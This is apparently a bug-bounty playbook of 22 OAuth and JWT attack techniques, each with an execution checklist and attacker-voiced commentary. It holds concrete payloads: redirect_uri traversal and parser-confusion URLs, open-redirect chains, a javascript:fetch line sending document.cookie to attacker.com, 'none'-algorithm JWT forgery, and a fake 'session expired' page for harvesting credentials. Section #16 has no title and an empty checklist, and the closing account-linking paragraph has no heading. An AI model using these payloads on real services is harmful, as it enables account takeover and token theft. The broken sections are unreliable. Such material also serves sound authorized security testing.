#01
Folder Traversal in redirect_uri (Reports #1 & #2)
CRITICAL REDIRECT BYPASS
SCENARIO
OAuth server validates redirect_uri prefix only (e.g., "starts with trusted.com") but doesn't check path — path traversal escapes to attacker domain.
// EXECUTION CHECKLIST
  • Intercept OAuth authorization request in Burp Suite — find redirect_uri= parameter
  • Try folder traversal: https://trusted.com/callback/../../attacker.com
  • Try URL-encoded traversal: https://trusted.com/callback/%2E%2E%2F%2E%2E%2Fattacker.com
  • Try double-encoded: https://trusted.com/callback/%252E%252E%252Fattacker.com
  • Observe: does browser follow redirect to attacker.com? Check VPS/Burp Collaborator logs
  • Capture: does URL contain code=AUTH_CODE or access_token=TOKEN when it arrives?
Victim clicks "Login with Google" → OAuth server sends code → redirect_uri = traversal to attacker.com → Code arrives on VPS logs → Exchange code for access token → Full ATO

"OAuth server validates that redirect starts at trusted.com — but where it ENDS is a different story. The path traversal escapes the allowed prefix like a jailbreak."

#02
Subdomain Logic & Character Injection (Report #5)
CRITICAL SUBDOMAIN BYPASS
SCENARIO
Server validates domain using string matching that can be confused by subdomain placement, fragment injection (#), or special character tricks.
// EXECUTION CHECKLIST
  • Try subdomain suffix confusion: https://attacker.com.trusted.com
  • Try subdomain prefix confusion: https://trusted.com.attacker.com
  • Try fragment injection: https://trusted.com%23.attacker.com (browser treats # as fragment → redirects to attacker.com)
  • Try @ injection: https://trusted.com@attacker.com (URL parser: trusted.com = username, attacker.com = host)
  • Try backslash: https://trusted.com\@attacker.com and https://trusted.com\/attacker.com
  • Try null byte: https://trusted.com%00attacker.com
  • Check VPS logs: which bypass caused the code to arrive on attacker server?

"URL parsers are inconsistent across languages. What Python sees as trusted.com, JavaScript sees as attacker.com. This inconsistency is the exploit."

Use Burp's "Param Miner" to fuzz all redirect_uri variations automatically. Also check if registered_redirect_uris endpoint leaks allowed list — some OAuth servers expose this in discovery docs at /.well-known/oauth-authorization-server

#03
Wildcard & Regex Bypass in redirect_uri
CRITICAL WILDCARD ABUSE Phase 1 — Report #12
SCENARIO
OAuth server allows wildcard subdomains (*.trusted.com). Any XSS or open redirect on any subdomain becomes a token theft vector.
// EXECUTION CHECKLIST
  • Check if server allows https://*.trusted.com — test with https://attacker.trusted.com
  • Enumerate all subdomains of trusted.com: subfinder -d trusted.com, amass enum
  • Find any subdomain with: XSS, open redirect, takeover potential (CNAME pointing to unregistered service)
  • Use that vulnerable subdomain as redirect_uri → chain subdomain vuln + OAuth = ATO
  • Also check: can you REGISTER a new subdomain (e.g., s3.amazonaws.com bucket, GitHub Pages)?

"*.trusted.com means every subdomain is trusted. Find one subdomain with XSS and you've turned a Medium into a Critical OAuth ATO."

#04
Open Redirect → OAuth Code Chain (Reports #3, #4)
CRITICAL OPEN REDIRECT CHAIN
SCENARIO
OAuth server validates redirect_uri strictly — but the main site has an open redirect. Use the open redirect URL AS the redirect_uri. Server trusts it (same domain), then it relays the code to attacker.
// EXECUTION CHECKLIST
  • First: find open redirect on main site — test params: ?redirect=, ?next=, ?url=, ?return_to=, ?goto=
  • Confirm open redirect: https://trusted.com/login?next=https://attacker.com → does it redirect?
  • Now in OAuth request: set redirect_uri=https://trusted.com/login?next=https://attacker.com
  • OAuth server validates: "yes, trusted.com domain" → approves it → sends code there
  • trusted.com's open redirect fires → forwards request (WITH code in URL) to attacker.com
  • Check attacker VPS logs: full URL with code arrives → exchange for access_token
OAuth Server → trusted.com/login?next=attacker.com → Open Redirect fires → attacker.com receives ?code=XYZ → Token Exchange → Full ATO

"I don't need to break the OAuth server. I just need to find a weak link in the CHAIN of trust. An open redirect on any trusted page is that weak link."

#05
Post-Login Redirect Abuse (Report #6)
HIGH POST-AUTH REDIRECT
SCENARIO
After successful OAuth login, the app redirects to a URL stored in session/state. Manipulate that URL to redirect victim post-login to attacker's phishing page.
// EXECUTION CHECKLIST
  • Observe the state parameter in OAuth request — does it encode a return URL?
  • Decode state: base64_decode(state) — look for {"redirect":"https://app.com/dashboard"}
  • Modify: change redirect value to attacker.com → re-encode → replace state parameter
  • Send victim the crafted login URL → after OAuth completes → they land on attacker.com
  • At attacker.com: serve fake "session expired, login again" page → harvest credentials
  • Also check: ?returnUrl=, ?next= parameters appended after callback URL

"The user trusts the destination because they just finished logging in to a legitimate site. The phishing page they land on looks legitimate because it comes from a trusted flow."

#06
Subdomain Takeover → OAuth Redirect
CRITICAL SUBDOMAIN TAKEOVER
SCENARIO
Subdomain of trusted.com is dangling (DNS points to decommissioned service). Register that service → take over subdomain → use it as OAuth redirect target.
// EXECUTION CHECKLIST
  • Enumerate subdomains: subfinder, amass, dnsx on target domain
  • Check for NXDOMAIN on subdomains with CNAME records — dangling DNS = takeover candidate
  • Identify service: Heroku? GitHub Pages? S3? Netlify? → Register that asset under attacker account

  • Use taken-over subdomain URL as redirect_uri in OAuth → OAuth server approves (same parent domain)
  • Host token-capturing script on taken-over subdomain → send crafted login link to victim

"Subdomain takeover alone is Medium severity. Subdomain takeover + OAuth redirect = Critical ATO. Always check if the target uses OAuth when you find a takeover."

#07
Authorization Code Leak via Referer Header (Reports #7, #8)
HIGH REFERER LEAK
SCENARIO
After OAuth redirect, the code/token is in the URL. If the callback page loads any external resource or has an outbound link, the browser sends the full URL (with code) as the Referer header to those external servers.
// EXECUTION CHECKLIST
  • Complete OAuth flow → land on callback page → check URL for ?code= or #access_token=
  • Check page source for ANY external resources: 3rd-party JS, CSS, images, analytics, fonts
  • In Burp, check all outgoing requests from callback page — look for Referer header containing the code
  • Check for outbound links: Social icons, Help button, Privacy policy → click each and inspect Referer
  • Check if Referrer-Policy header is set: no-referrer-when-downgrade = still leaks to HTTPS sites
  • For access_token in URL (#fragment): fragment doesn't leak via Referer but leaks if page does document.location logging

"The callback page is the most dangerous page in the OAuth flow. Every pixel loaded from an external server, every analytics beacon — each one is a potential token thief."

Check: does the page use Google Analytics, Facebook Pixel, Mixpanel? These analytics scripts fire on every page load and send the full URL (including code) to their servers. That's a reportable information disclosure.

#08
Access Token in URL Fragment — JS Log Leak
HIGH FRAGMENT LEAK
SCENARIO
Implicit flow sends access_token in URL fragment (#). While fragment doesn't go to server, frontend JS may log or send it to error tracking services (Sentry, LogRocket, etc.).
// EXECUTION CHECKLIST
  • Check if OAuth uses implicit flow: response_type=token → token appears as #access_token=XYZ
  • Monitor ALL JS network requests from callback page — look for error reporting tools (Sentry, Bugsnag)
  • Check for: window.location.href or document.referrer passed to analytics
  • Check browser history — does the token appear in browser history? (History API leak)
  • Check server access logs via Burp — does any backend endpoint receive the fragment value?
  • Report: app should use response_type=code (authorization code) instead of implicit flow

"Fragment identifiers were designed to stay client-side. But when developers paste window.location.hash into a Sentry error report, the token goes to Sentry's servers."

#09
Token Leak via Browser History & Logs
MEDIUM TOKEN EXPOSURE
SCENARIO
Authorization code or access_token persists in URL after use — remains in browser history, server logs, and proxy logs exposing it to anyone with access.
// EXECUTION CHECKLIST
  • Complete OAuth flow → immediately check browser URL bar — is token still visible?
  • Check: does app use history.replaceState() to clean token from URL after reading it? If NOT → vuln
  • Open browser history → is the full URL with code still there?
  • Check server access logs (if you have access): does the token appear in GET request URL?
  • Document: code not invalidated + persists in URL = dual exposure (history + server logs)

"Once the code is used, it should vanish from the URL. If the app doesn't call history.replaceState(), the token sits in browser history like a spare key under the doormat."

#10
HTTP Parameter Pollution on redirect_uri (Report #9)
HIGH HPP · PARAM POLLUTION
SCENARIO
Send multiple redirect_uri parameters. Different backend components may use different ones — OAuth validator reads first (trusted), redirect logic uses last (attacker).
// EXECUTION CHECKLIST
  • In OAuth authorization request: add double redirect_uri: redirect_uri=https://trusted.com/cb&redirect_uri=https://attacker.com
  • Try reversed order: redirect_uri=https://attacker.com&redirect_uri=https://trusted.com/cb
  • Try array notation: redirect_uri[]=https://trusted.com&redirect_uri[]=https://attacker.com
  • Try comma-separated: redirect_uri=https://trusted.com,https://attacker.com
  • Observe: which URL receives the authorization code? First? Last? Both?

"The OAuth validator and the redirect handler are two different code paths. HPP exploits the gap between what they each read — one sees the safe value, the other sees mine."

#11
XSS via redirect_uri Reflection (Report #10)
CRITICAL XSS · TOKEN THEFT
SCENARIO
The redirect_uri value is reflected in the error page or the OAuth consent screen source code without sanitization — inject XSS payload to steal tokens via script execution.
// EXECUTION CHECKLIST
  • Submit invalid redirect_uri → observe error page → does the URI value appear in page source?
  • Try basic XSS: redirect_uri=javascript:alert(document.domain)
  • Try reflected in href context: redirect_uri=https://x.com"><script>alert(1)</script>
  • Try javascript: URI in consent screen link: redirect_uri=javascript:fetch('https://attacker.com?c='+document.cookie)
  • If XSS fires: extract document.location (code in URL), cookies, localStorage tokens
  • Chain: XSS on OAuth consent page = highest-trust page in the flow = Critical impact

"XSS on an OAuth consent page is the most dangerous XSS in an application. The user has JUST authenticated — their session is fresh and their tokens are right there in memory."

#12
scope Manipulation & Privilege Escalation (Report #11)
HIGH SCOPE ESCALATION
SCENARIO
The scope parameter controls what access the token grants. Server doesn't validate scope properly — add admin/elevated scopes to get a token with more permissions than intended.
// EXECUTION CHECKLIST
  • Capture OAuth request → find scope=read or scope=profile email
  • Escalate: add admin scopes: scope=read write admin, scope=openid admin:org
  • Try: scope=* or scope=all (wildcard scope request)
  • If server doesn't show error → check issued token's introspection endpoint for granted scopes
  • Use elevated-scope token to call admin API endpoints → privilege escalation confirmed
  • Also test: offline_access scope without user consent → persistent token refresh without user knowing

"The scope parameter is a shopping list. If the cashier (OAuth server) doesn't check what you put in the cart, you walk out with admin access you never paid for."

#13
OAuth Account Pre-Hijacking (Report #13)
CRITICAL PRE-HIJACK
SCENARIO
Attacker registers with victim's email using password-based auth. When victim later signs up via Google/GitHub (same email), accounts merge — attacker retains access.
// EXECUTION CHECKLIST
  • Register account using victim's email + attacker's password (before victim signs up)
  • Do NOT verify the email → leave account in "unverified" state
  • When victim signs up via "Login with Google" using same email → test if accounts auto-merge
  • After victim registers via Google: try logging in with attacker's original password
  • If login works → attacker retains access to victim's account = Critical pre-hijack ATO
  • Also test: CSRF variant — force victim to merge their OAuth account with attacker's existing account

"The race condition in identity is: who claims the email first? If I claim it with my password before you claim it with Google, we share the account — but only I know the password."

#14
CSRF on OAuth Authorization — State Parameter Missing
HIGH CSRF · NO STATE
SCENARIO
OAuth flow missing state parameter (or using predictable/missing CSRF validation). Attacker can force victim's browser to link their OAuth account to attacker's application account.
// EXECUTION CHECKLIST
  • Check OAuth authorization request: is state= parameter present?
  • Check: is state validated server-side? Remove/modify state and see if flow still completes
  • CSRF attack: Start attacker's own OAuth flow → capture callback URL with code → stop before completion
  • Force victim to visit the captured callback URL → victim's browser completes attacker's OAuth flow
  • Result: victim's Google/GitHub account linked to attacker's app account → attacker logs in as victim

"The state parameter is the OAuth flow's CSRF token. Without it, I can hijack the callback — the user clicks 'Allow' but the code ends up in my account."

#15
Authorization Code Reuse (No Single-Use Enforcement)
HIGH CODE REUSE
SCENARIO
Authorization code should be single-use and short-lived. If not invalidated after first exchange, attacker who intercepts code can use it again (replay attack).
// EXECUTION CHECKLIST
  • Complete OAuth flow → capture authorization code at callback URL
  • Exchange code for token once → note the access_token received
  • Send the SAME code to token endpoint again → does it return another token?
  • Try after 5 minutes, 1 hour — what is the actual code expiry?
  • Test race condition: send 10 simultaneous requests with same code → does any return a token?

"An authorization code is a one-time password for a vault. If the bank lets you use the same OTP twice, the vault is always open to whoever intercepts it once."

SCENARIO
client_secret is hardcoded in JavaScript, mobile app, or public repository — allows anyone to impersonate the application and exchange codes or refresh tokens.
// EXECUTION CHECKLIST

#17
OAuth Consent Screen Bypass (Force Approve)
HIGH CONSENT BYPASS
SCENARIO
OAuth consent screen can be bypassed or auto-approved using prompt=none, previously granted consent, or response_mode manipulation — user never sees what they're approving.
// EXECUTION CHECKLIST
  • Add prompt=none to OAuth request → does server skip consent screen and auto-approve?
  • Add prompt=consent but with extra scope → re-approval shown but scopes pre-checked?
  • Try response_mode=fragment vs response_mode=query → different token handling
  • Send OAuth link to victim → does it auto-approve if victim previously consented (even to different scope)?
  • Check: can you add new scopes to an already-approved app without re-consent? → silent scope escalation

"'prompt=none' was designed for seamless SSO. When a server auto-approves it for any app (not just first-party), consent becomes meaningless and any scope request gets silently granted."

#18
Token Fixation — Predictable State Attack
HIGH TOKEN FIXATION
SCENARIO
State parameter is predictable (timestamp, sequential number, or weak random). Attacker predicts the state, waits for victim to complete OAuth, then uses predicted state to hijack the callback.
// EXECUTION CHECKLIST
  • Collect 10 state parameter samples from rapid OAuth initiations → analyze entropy
  • Decode state: base64? MD5 of timestamp? Sequential numbers? UUID v1 (time-based)?
  • If timestamp-based: predict next state value for a given time window
  • Test: can you reuse an old state value in a new OAuth flow? → state not bound to session
  • Fixation: inject your known state into victim's OAuth URL → when their flow completes with your state → you get their code

"State is meant to be a random nonce binding the request to the user's session. A predictable state is a predictable lock — I just need to know what time the victim started the flow."

#19
JWT Algorithm Confusion (none / RS256→HS256)
CRITICAL JWT ATTACK · CRITICAL
SCENARIO
Server accepts JWT tokens with 'none' algorithm or confuses RS256 public key as HS256 HMAC secret — attacker forges any token with arbitrary claims.
// EXECUTION CHECKLIST
  • Obtain a valid JWT token → decode at jwt.io → identify algorithm: RS256, HS256, ES256
  • Test "none" algorithm: change header to {"alg":"none"} → remove signature → send token
  • Test "None" (capitalized), "NONE", "nOnE" — different case variants bypass some validators
  • RS256→HS256 confusion: get public key from /.well-known/jwks.json → use as HMAC secret with HS256
  • Forge token: change sub (user ID) to victim's ID, escalate role claim to "admin"
  • Use jwt_tool or python-jwt to automate all algorithm confusion attacks

"The algorithm field in a JWT header is trusted by naive libraries. If I can change RS256 to HS256, the server suddenly uses the PUBLIC key to verify — a key I already have."

#20
Refresh Token Abuse — Infinite Session Persistence
HIGH REFRESH TOKEN
SCENARIO
Refresh tokens are not rotated, not bound to client, or not revoked on password change — attacker who captures a refresh token maintains permanent access.
// EXECUTION CHECKLIST
  • Capture refresh_token from localStorage, network request, or cookie
  • Test: use refresh_token from a DIFFERENT client_id — does it work? (Token not bound to client)
  • Test: user changes password → is old refresh_token invalidated? Try getting new access_token
  • Test: user revokes app access → refresh_token still works? → revocation not implemented
  • Test rotation: use refresh_token → get new access_token → try OLD refresh_token again → should be invalid
  • Send refresh_token request from different IP/User-Agent → is client binding enforced?

"A refresh token that isn't revoked on password change is an undead backdoor. The user thinks they're safe after resetting their password. They are not."

#21
PKCE Bypass — Code Verifier Downgrade
CRITICAL PKCE BYPASS
SCENARIO
PKCE (Proof Key for Code Exchange) protects against code interception. But if server doesn't enforce it, remove PKCE parameters and exchange any intercepted code directly.
// EXECUTION CHECKLIST
  • Check if OAuth request includes code_challenge= and code_challenge_method=S256
  • Remove both parameters entirely → does authorization still proceed?
  • At token exchange: omit code_verifier parameter → does server still return token?
  • Try downgrade: use code_challenge_method=plain instead of S256 → weaker verification
  • If PKCE bypass works: intercept any code → exchange without knowing code_verifier = ATO

"PKCE is a padlock on the authorization code. If the server says 'PKCE optional', the padlock is decorative. Anyone who intercepts the code can use it without the key."

#22
Cross-Provider Token Mixing Attack
CRITICAL TOKEN MIXING
SCENARIO
App accepts tokens from multiple OAuth providers (Google + Facebook + GitHub). Server doesn't validate WHICH provider issued the token — use a Google token to authenticate against Facebook's endpoint.
// EXECUTION CHECKLIST
  • Identify all OAuth providers the app supports: Google, Facebook, GitHub, Microsoft, etc.
  • Get a valid token from Provider A (e.g., Google) → send it to Provider B's (Facebook) OAuth endpoint
  • Check if server validates token's issuer (iss claim in JWT) → if not → cross-provider confusion
  • Use attacker's Google token with victim's Facebook-linked email → does app merge accounts?
  • Check: does app verify aud (audience) claim matches its own client_id? If not → token replay from other apps

"An app that accepts tokens from 5 providers without checking ISS is like a bouncer who accepts any ID from any country without checking that the ID belongs to the person showing it."

Account linking endpoint (linking Google to an existing account) has no CSRF protection. Attacker forces victim to link attacker's Google account to victim's app account.
